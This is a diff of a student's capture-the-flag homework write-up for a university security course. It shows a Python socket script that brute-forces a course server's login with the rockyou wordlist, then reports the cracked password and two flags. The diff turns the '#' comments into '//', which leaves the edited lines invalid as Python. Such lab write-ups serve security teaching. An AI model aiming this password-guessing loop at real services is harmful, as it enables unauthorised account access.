@@ -56,41 +56,41 @@ socket I/O such as reading and printing.
 
 My code:
 
-# Tuan Le
-# UID: 115260047
-# CMSC 389R (0201)
+// Tuan Le
+// UID: 115260047
+// CMSC 389R (0201)
 
 import socket
 
-# IP address
+// IP address
 host = "142.93.136.81"
 
-# Open port to connect to
+// Open port to connect to
 port = 1337 
 
-# Wordlist file: "/usr/share/wordlists/rockyou.txt"
+// Wordlist file: "/usr/share/wordlists/rockyou.txt"
 wordlist = open("/usr/share/wordlists/rockyou.txt", "r")
 
 def brute_force():
     
-    # Sockets: https://docs.python.org/2/library/socket.html
+    // Sockets: https://docs.python.org/2/library/socket.html
 
     username = "v0idcache"   # Hint: use OSINT
 
-    # Iterate through each password in the wordlist and reapeatedly attempt to
-    # log into v0idcache's server
+    // Iterate through each password in the wordlist and reapeatedly attempt to
+    // log into v0idcache's server
     for password in wordlist:
 
-        # Establish socket connection
+        // Establish socket connection
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
         
-        # Reading username prompt and sending username
+        // Reading username prompt and sending username
         data = s.recv(1024)      # Receives 1024 bytes from IP/Port
         s.send("v0idcache\n")
         print(data + username)
 
-        # Reading password prompt and sending password
+        // Reading password prompt and sending password
         data = s.recv(1024)      # Receives 1024 bytes from IP/Port
         s.send(password)
         print(data + password)
@@ -101,8 +101,10 @@ if __name__ == '__main__':
     brute_force()
 
 I found 2 flags
+
 CMSC389R-{brut3_f0rce_m4ster} - Found the username to be v0idcache and the password
 linkinpark. Once I gained access, I cd into home and cat flag.txt
+
 CMSC389R-{YWX4H3d3Bz6dx9lG32Odv0JZh} - Once I had access, I cd into home then cd
 files then I cat a file called AB4300.txt which I found within a chat between 
 v0idcache and fl1inch on pastebin.
